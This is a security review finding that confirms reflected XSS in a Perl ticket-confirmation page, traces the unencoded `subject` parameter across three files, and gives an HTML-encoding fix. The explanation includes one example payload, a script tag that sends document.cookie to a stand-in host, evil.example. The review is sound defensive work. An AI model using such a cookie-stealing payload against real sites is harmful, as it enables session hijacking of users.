## Verdict

Confirmed. `TicketPageRenderer::render_confirmation` interpolates `$subject` directly into the HTML response body without any HTML-entity encoding, and the value is attacker-controlled end to end.

## Source

`ticket_controller.pl` line 14 reads the untrusted CGI parameter:

```
my $subject  = $cgi->param('subject');
```

This raw value is passed unmodified into `TicketSummary->new` (line 19-22), stored verbatim by `TicketSummary::new` (`subject => $args{subject}` in `TicketSummary.pm` line 14) with no normalization — unlike `priority`, which is passed through `_normalize_priority` and constrained to a known allowlist (`low`/`normal`/`high`/`urgent`). The `subject` accessor (`TicketSummary.pm` line 29) returns this untouched string, which `TicketPageRenderer::render_confirmation` then reads at line 13 and writes into the response at line 19.

## Fix

In `TicketPageRenderer.pm`, HTML-encode `$subject` (and, for defense in depth, the other interpolated values) at the point of output, rather than trying to sanitize it earlier in the chain:

```perl
package TicketPageRenderer;
use strict;
use warnings;
use feature 'say';
use HTML::Entities qw(encode_entities);

sub render_confirmation {
    my ($summary) = @_;

    my $ticket_id = $summary->ticket_id;
    my $priority  = $summary->priority;
    my $subject   = encode_entities($summary->subject);

    say "<html><body>";
    say "<h1>Ticket #$ticket_id filed</h1>";
    say "<p>Priority: $priority</p>";
    say "<p>Subject: $subject</p>";
    say "</body></html>";

    return;
}

1;
```

`HTML::Entities` is part of the widely-used `libhtml-parser-perl` distribution; confirm it's already a project dependency (or add it) before shipping this change. `encode_entities` with no explicit character set escapes the standard set needed for safe HTML text-node output (`<`, `>`, `&`, `"`, `'`, and control/high-bit characters), which is sufficient here since `$subject` is only ever placed inside a text node, not inside an attribute value or a `<script>` block.

## Explanation

`$ticket_id` is a server-generated integer and `$priority` is constrained to a fixed allowlist in `TicketSummary::_normalize_priority`, so neither is exploitable. `$subject`, however, is free-text the requester typed, and it crosses three files unmodified: `ticket_controller.pl` pulls it straight from `CGI::param`, `TicketSummary.pm` stores it as-is (its own comment even flags that "the subject line passes through untouched"), and `TicketPageRenderer.pm` writes it directly into an HTML text node with plain string interpolation. A subject like `<script>document.location='//evil.example/?c='+document.cookie</script>` would be reflected into the confirmation page and executed in the requester's browser — classic reflected XSS.

Encoding at the render boundary (rather than filtering at intake) is the right layer for the fix: it guarantees every caller of `render_confirmation` gets a safe page regardless of what future callers do with `TicketSummary`, and it keeps the domain object free of presentation concerns. Encoding earlier, in `TicketSummary.pm`, would risk double-encoding if the value is ever reused in a non-HTML context (an API response, a log line, a plain-text notification email) or needs re-editing before submission.

After the fix, verify with a subject containing `<`, `>`, `&`, and a quote character and confirm the response body shows the escaped entities (`&lt;`, `&gt;`, `&amp;`, `&quot;`/`&#39;`) rather than raw markup, and that a `<script>`-bearing payload no longer executes when the response is rendered in a browser.
